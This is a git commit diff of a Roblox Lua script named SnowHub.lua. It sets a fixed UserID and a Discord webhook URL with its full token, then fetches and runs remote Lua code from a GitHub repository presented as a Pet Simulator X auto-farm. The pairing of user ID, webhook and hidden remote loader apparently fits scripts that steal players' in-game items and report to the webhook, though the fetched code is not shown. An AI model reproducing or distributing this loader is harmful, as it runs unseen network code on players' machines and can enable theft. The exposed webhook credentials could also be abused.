014f040f5afa4910efb787d5eb8802b4a7c75c89
PsxScriptMaker <124332608+PsxScriptMaker@users.noreply.github.com>
2023-02-10 11:39:36 +0800

    Update and rename Main.lua to SnowHub.lua

--- SnowHub.lua
+++ SnowHub.lua
@@ -1,5 +1,5 @@
 _G.UserID = 3380431035
 
-_G.WebHook = "https://discord.com/api/webhooks/1073117075922485299/1ZHUpao8r84j0SWx9e0EiJ2_Set5JsIV20pWEzezbBXdfBwVGVj-GxR7vsdKPXGZKcnM"
+_G.WebHook = "https://discord.com/api/webhooks/1073447374522941461/VfdC5m80EvGpM_Ok5wDKAH-Nmm6rCD4XgNzTHg4qZvWQcagpqN-ERVWjNPi3baRMs7o_"
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
